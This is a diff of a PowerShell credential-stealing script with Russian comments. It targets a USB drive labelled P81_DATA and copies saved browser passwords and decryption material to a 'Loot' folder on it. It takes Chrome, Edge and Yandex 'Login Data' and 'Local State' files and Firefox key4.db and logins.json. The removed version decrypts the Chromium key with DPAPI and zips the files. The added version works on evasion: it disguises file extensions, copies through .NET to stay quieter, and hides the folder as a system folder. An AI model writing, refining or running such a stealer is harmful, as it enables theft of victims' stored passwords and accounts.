@@ -1,73 +1,47 @@
-# 1. Поиск флешки по метке тома
-$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter
+$v = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter
+if (!$v) { exit }
 
-if ($usb) {
-    $destPath = "$($usb):\Loot"
-    if (!(Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath | Out-Null }
-    
-    $tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
-    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+# Создаем папку под видом системного кэша
+$dst = "$($v):\Loot\System_$(Get-Random -Min 1000 -Max 9999)"
+[System.IO.Directory]::CreateDirectory($dst) | Out-Null
 
-    Add-Type -AssemblyName System.Security
+# Маскировка расширения (вместо .db или .json)
+$ext = ".dat"
 
-    # --- БЛОК CHROMIUM (Chrome, Edge, Yandex) ---
-    function Get-Key($p, $l) {
-        if (Test-Path $p) {
-            try {
-                $j = Get-Content $p -Raw | ConvertFrom-Json
-                $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
-                $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
-                "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\keys.txt" -Append
-                return $true
-            } catch { return $false }
+# Список целей (пути относительно LocalAppData)
+$targets = @(
+    "Google\Chrome\User Data",
+    "Microsoft\Edge\User Data",
+    "Yandex\YandexBrowser\User Data"
+)
+
+# 1. Сбор Chromium (без Copy-Item)
+foreach ($t in $targets) {
+    $p = Join-Path $env:LOCALAPPDATA $t
+    if (Test-Path $p) {
+        Get-ChildItem -Path $p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
+            $fn = "$(Get-Random -Min 10000 -Max 99999)$ext"
+            # Используем нативный метод .NET для копирования (тише, чем PowerShell)
+            [System.IO.File]::Copy($_.FullName, (Join-Path $dst $fn), $true)
         }
-        return $false
-    }
-
-    $cPaths = @(
-        @{n="CH"; p="Google\Chrome\User Data"},
-        @{n="ED"; p="Microsoft\Edge\User Data"},
-        @{n="YX"; p="Yandex\YandexBrowser\User Data"}
-    )
-
-    foreach ($b in $cPaths) {
-        $target = Join-Path $env:LOCALAPPDATA $b.p
-        if (Test-Path $target) {
-            Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
-                $label = "$($b.n)_$($_.Directory.Name)"
-                if (Get-Key (Join-Path $target "Local State") $label) {
-                    Copy-Item $_.FullName -Destination "$tmp\$label.db" -Force -ErrorAction SilentlyContinue
-                }
-            }
+        # Забираем Local State для ключей
+        $ls = Join-Path $p "Local State"
+        if (Test-Path $ls) { 
+            [System.IO.File]::Copy($ls, (Join-Path $dst "state_$(Get-Random)$ext"), $true)
         }
     }
-
-    # --- БЛОК FIREFOX ---
-    $ffPath = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
-    if (Test-Path $ffPath) {
-        $profiles = Get-ChildItem -Path $ffPath -Directory
-        foreach ($prof in $profiles) {
-            $pName = "FF_$($prof.Name)"
-            # Для расшифровки Firefox нужны оба этих файла
-            $files = @("key4.db", "logins.json", "cert9.db", "cookies.sqlite")
-            foreach ($f in $files) {
-                $fPath = Join-Path $prof.FullName $f
-                if (Test-Path $fPath) {
-                    Copy-Item $fPath -Destination "$tmp\$pName`_$f" -Force -ErrorAction SilentlyContinue
-                }
-            }
-        }
-    }
-
-    # 2. Упаковка и перенос на флешку
-    if ((Get-ChildItem $tmp).Count -gt 0) {
-        $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
-        Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
-        
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        Move-Item $z "$destPath\loot_$timestamp.zip" -Force
-    }
-
-    Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
 }
+
+# 2. Сбор Firefox
+$ff = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
+if (Test-Path $ff) {
+    Get-ChildItem -Path $ff -Recurse -Include "key4.db","logins.json" -ErrorAction SilentlyContinue | ForEach-Object {
+        $fn = "ff_$(Get-Random)$ext"
+        [System.IO.File]::Copy($_.FullName, (Join-Path $dst $fn), $true)
+    }
+}
+
+# 3. Финальный штрих: скрываем папку на флешке
+$folder = Get-Item $dst -Force
+$folder.Attributes = 'Hidden', 'System'
 exit
